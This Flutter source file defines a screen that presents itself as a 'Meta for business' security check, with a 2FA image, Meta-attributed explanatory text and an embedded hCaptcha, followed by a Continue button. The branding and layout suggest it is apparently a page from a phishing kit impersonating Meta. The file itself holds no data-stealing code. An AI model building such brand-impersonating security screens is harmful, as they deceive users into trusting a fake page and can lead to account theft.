import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:gap/gap.dart';
import 'package:go_router/go_router.dart';
import 'package:webviewx/webviewx.dart';

class CapchaScreen extends StatefulWidget {
  const CapchaScreen({super.key});

  @override
  State<CapchaScreen> createState() => _CapchaScreenState();
}

class _CapchaScreenState extends State<CapchaScreen> {
  late WebViewXController webviewController;
  String html = """<html>
  <head>
    <title>hCaptcha</title>
    <script src="https://hcaptcha.com/1/api.js" async defer></script>
  </head>
  <body>
    <center>
      <form action="?" method="POST">
        <div class="h-captcha"
          data-sitekey="0af194b8-2412-4dbb-975e-a25ad88c832a"
          data-callback="captchaCallback"></div>
      </form>
    </center>
    <script>
      function captchaCallback(response) {
        if (typeof Captcha !== "undefined") {
          Captcha.postMessage(response);
        }
      }
    </script>
  </body>
</html>
""";
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SingleChildScrollView(
        child: Center(
            child: Container(
          width: 500,
          decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.grey, width: 1)),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Image.asset(
                "assets/images/png/2fa.jpg",
                width: 500,
              ),
              Gap(12),
              const Text(
                "Meta for business",
                style: TextStyle(fontSize: 24),
              ),
              Gap(12),
              const Text(
                "Security check",
                style: TextStyle(fontSize: 24),
              ),
              Gap(12),
              const Text(
                  style: TextStyle(
                    fontSize: 14,
                    color: Colors.black,
                  ),
                  """Meta uses security tests to ensure that the people on the site are real.
                  Please fill the security check below to continue further."""),
              Gap(12),
              Center(
                child: WebViewX(
                initialContent: html, // Đổi URL của trang web bạn muốn hiển thị
                javascriptMode: JavascriptMode.unrestricted,
                initialSourceType: SourceType.html,
                onWebViewCreated: (controller) =>
                    webviewController = controller,
                width: 500,
                height: 110,
              ),
            ),
            Gap(16),
            GestureDetector(
                onTap: () {
                  context.pushReplacement("/home");
                },
                child: Container(
                    padding: EdgeInsets.all(12),
                    margin: EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(8),
                        color: Colors.blue),
                    width: double.infinity,
                    child: Center(
                        child: Text(
                      "Continue",
                      style: TextStyle(color: Colors.white, fontSize: 16),
                    )))),
            Gap(12)
          ],
        ),
      )),
      ),
    );
  }
}
